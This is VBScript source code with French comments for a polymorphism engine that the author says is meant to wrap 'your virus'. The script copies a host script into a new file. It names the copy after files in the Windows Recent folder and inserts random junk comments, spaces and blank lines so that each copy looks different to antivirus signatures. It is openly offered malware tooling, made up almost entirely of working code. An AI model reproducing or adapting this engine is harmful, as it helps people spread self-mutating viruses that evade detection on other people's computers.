Dim fso, f, ts, MyFile, Nom, Hasard, Moi, DebText, Test 
' Déclare les variables
Const Lecture = 1, Ecriture = 2 
'declare des constantes pour que le code soit plus lisible
Const TristateUseDefault = -2, TristateTrue = -1, TristateFalse = 0
Const vbBinaireComparaison = 0
    Randomize
    Set fso = CreateObject("Scripting.FileSystemObject")
    Moi = "vbs_Engine.vbs" 
' Moi est le nom du fichier où vous mettez mon moteur de polymorphisme
Nom = NomHasard + ".vbs"  'appel la fonction NomHasard

    fso.CreateTextFile Nom
'créer un fichier avec comme nom la variable Nom
    Set ts = fso.OpenTextFile(Nom, Ecriture)'
'l'ouvre en écriture
    Set MyFile = fso.OpenTextFile(Moi, Lecture)
'ouvre ce fichier en mode lecture

'Voici une petite boucle qui est l'essentiel dans mon moteur. La boucle s'arrête 
'quand le programme est arrivé au bout du fichier de votre virus.
    Do
        Hasard = Int(Rnd * 4 + 1)
        If Hasard = 1 Then DebText = Enter
        If Hasard = 2 Then DebText = Code
        If Hasard = 3 Then DebText = Argument
        If Hasard = 4 Then DebText = SpaceFunc(10, 20)
    If Hasard = 5 Then DebText = vbCrLf

    ts.WriteLine DebText
    If MyFile.AtEndOfStream = True Then Exit Do
    Loop
    
    ts.Close
    MyFile.Close

'Cette fonction recherche la prochaine ligne de code dans le fichier et l'écrit dans le fichier 'finale .vbs
Function Code()
    Dim Verif, Pas_Espace
    If MyFile.AtEndOfStream = False Then Test = MyFile.ReadLine
    If Left(Test, 1) = "'" Then Call Code
    If Test = "" Then Call Code
    If VerifEspaceFunc = False Then Call Code
    If Left(Test ,10) = "    Moi = " Then Test = "    Moi = " + """" + Nom + """": 
Code = Test
End Function

Function VerifEspaceFunc()
    Dim i
    For i = 1 To Len(Test)
    If Mid(Test, i, 1) <> Chr(32) Then VerifEspaceFunc = True : Exit For
    VerifEspaceFunc = False
    Next
End Function

'Cette fonction permet de créer une chaîne de caractère ASCII compris entre 14 et  255 ( et 
'ouais car avant 13 les caractères comme [entrée], [tab]  font planter le script vbs 
'meme s'ils sont dans des arguments) de longueur comprise entre NbMin et NbMax.
Function Chaine_Aleatoire(NbMin, NbMax)
    Dim z, i
    Randomize
    z = Int(Rnd * (NbMax - NbMin) + NbMin)
    For i = 0 To z
        Chaine_Aleatoire = Chr(14 + Int(Rnd * 241)) + Chaine_Aleatoire
    Next
End Function

'Cette fonction permet de créer une chaîne de caractère contenant des espaces de
'longueur comprise entre les nombre des variables 
'MinSpace et MaxSpace.
Function SpaceFunc(MinSpace, MaxSpace)
    Dim b
    b = Int(Rnd * (MaxSpace - MinSpace) + MinSpace)
    SpaceFunc = Space(b)
End Function

'Cette fonction crée une chaine aléatoire
Function Argument()
    Dim Comment, Espace, NbAleatoire
    Argument = Chaine_Aleatoire(Int(Rnd * 10), Int(Rnd * 10) + 10)
    Espace = SpaceFunc(Int(Rnd * 3), Int(Rnd * 5) + 3)
    NbAleatoire = Int(Rnd * 2) + 1
    If NbAleatoire = 1 Then Comment = vbCrLf
    If NbAleatoire = 2 Then Comment = Espace
    If NbAleatoire = 3 Then Comment = ""
    Argument = "'" + Argument + Comment
End Function

'Cette fonction permet de créer une chaîne de caractère contenant 1 à 4 [entrée]
'en utilisant comme proprièté vbCrLf car  vbCrLf =[entrée]

Function Enter()
    Dim c, d
    d = Int(Rnd * 4) + 1
    For c = 0 To d
        Enter = Enter + vbCrLf
    Next
End Function

'Cette fonction permet de générer un nom en le trouvant dans le dossier
'Windows. J'aurais pu utiliser ceux se trouvant dans le dossier \Recent
'qui contient les fichier du menu démarrer document mais le dossier Recent
'se trouve à un chemin différent selon le windows (95, ... contre NT)

Function NomHasard()
    Dim n, m, longueur, DossierR, fc, f1, s, Dossier
    Const Dossier_Windows = 0
    Set DossierR = fso.GetFolder(Recent(fso.GetSpecialFolder(Dossier_Windows)))
    Set fc = DossierR.Files
    x = 0
    'on calcule avec la variable x le nombre de fichier dans le dossier \Recent
    For Each f1 In fc
        x = x + 1
    Next
    
    If x <> 0 Then
        x = Int(Rnd * x + 1)
        s = 0
        For Each f1 In fc
            s = s + 1
            If s = x Then NomHasard = fso.GetBaseName(f1.Name) : Exit For
        Next
    End If
    
   'Cette procédure permet de créer une chaîne de caractère de longueur 
   'entre 3 et 11 et 'avec comme caractère des majuscules car le code 
   'ASCII est compris entre 25 et 90 . Si il n'a pas trouvé de fichiers 
   'dans le dossier ou s'il a trouvé son nom.
    If Moi = NomHasard + ".vbs" Then x = 0
    If x = 0 Then
        longueur = Int(Rnd * 8) + 3
        For n = 1 To longueur
            m = Chr(Int(Rnd * 25) + 65) + m
        Next
        NomHasard = m
    End If
End Function


'Cette fonction permet de renvoyer un dossier \recent selon le système d'exploitation
function Recent(Doss)
    if right(Doss,7) = "windows" then  'pour win 95 , ....
        Recent = Doss + "\Recent" 
        exit function
    end if
    if right(doss,5)="WINNT" then 'pour win NT4
        folderspec = Doss + "\profiles" 
        Set f = fso.GetFolder(folderspec)
        Set sf = f.SubFolders
        For Each f1 in sf
            if f1.name <> "All Users" then
                Recent = folderspec + "\" + s
                Exit for
            end if
        Next
        'on calcule avec la variable x le nombre de dossier dans le dossier \Profiles
        x = 0
        For Each f1 In sf
            x = x + 1
        Next

        'on en prend un au hasard différent de all user car il ne 
        'contient pas de dossier \Recent. Si on tombe malheuresement sur celui là
        'on prend comme dossier le dossier windows   
        If x <> 0 Then
            x = Int(Rnd * x + 1)
            s = 0
            For Each f1 In sf
                s = s + 1
                If s = x Then 
                    if f1.name <> "All Users" then
                        Recent = folderspec + "\" + f1.name+"\Recent"
                    else 
                        recent = fso.GetSpecialFolder(Dossier_Windows)
                    end if
                    Exit for
                end if
            Next
        End If
    End If
end Function